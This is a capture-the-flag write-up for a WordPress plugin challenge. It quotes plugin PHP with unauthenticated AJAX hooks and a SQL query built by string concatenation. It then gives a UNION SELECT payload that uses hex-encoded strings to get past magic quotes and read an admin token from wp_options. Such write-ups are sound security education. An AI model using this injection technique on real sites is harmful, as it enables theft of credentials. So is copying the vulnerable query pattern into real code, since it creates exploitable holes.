## TITLE
AJAX Amsterdam

<br>

## DESCRIPTION:
F-Side is a Dutch football hooligan group and fanatical supporter base associated with the Amsterdam-based club AFC Ajax. So..

*Note: This is Wordpress's plugin CTF challenge.

<br>

## AUTHOR
`nblirwn`

## Solution

To retrieve the flag, we need to call the `aaf_sys_maintenance` ajax action. This is a nopriv hook, so no authentication is required. To call it, we need to set our user agent to "F-Side" and include `auth_token` which matches the value of `aaf_admin_token`.

```php
add_action('wp_ajax_nopriv_aaf_sys_maintenance', 'aaf_maintenance_mode');
...
function aaf_maintenance_mode() {
    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== 'F-Side') {
        header("HTTP/1.1 403 Forbidden");
        echo json_encode(array("error" => "Access Denied. Fake fan detected."));
        wp_die();
    }

    $input_token = isset($_POST['auth_token']) ? $_POST['auth_token'] : '';
    $real_token = get_option('aaf_admin_token');

    if ($input_token === $real_token) {
        $response = array(
            "status" => "success",
            "action" => "System Unlocked. F-Side controls the narrative.",
            "flag" => "RE:CTF{dontsubmitthisflagplease}"
        );
        echo json_encode($response);
```

There is a SQL injection in the `aaf_load_data` action, again this is a nopriv hook so no authentication is needed.

```php
add_action('wp_ajax_nopriv_aaf_load_data', 'aaf_remote_loader');
add_action('wp_ajax_aaf_load_data', 'aaf_remote_loader');

function aaf_remote_loader() {
    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== 'F-Side') {
        header("HTTP/1.1 403 Forbidden");
        echo json_encode(array("error" => "Access Denied. Fake fan detected."));
        wp_die();
    }

    global $wpdb;
    $table_name = $wpdb->prefix . 'aaf_reviews';

    $rid = $_GET['rid']; 
    ...
    $query = "SELECT player_name, critique FROM $table_name WHERE id = " . $rid;
```

The `rid` parameter is vulnerable, but note that because our code is being executed through hooks, our input will go through `add_magic_quotes()` internally so typical string injections would not work. We can get around this issue by either:

1. Brute force rows in the `wp_option` table until we get `aaf_admin_token`
2. Use hexstrings

```
UNION SElECT option_name,option_value FROM wp_options WHERE option_name=0x6161665f61646d696e5f746f6b656e
```

Then make a request to `aaf_sys_maintenance` with `aaf_admin_token` to obtain the flag.

Flag: `RE:CTF{ezchainingunauthsqli2bac_oleeoleee}`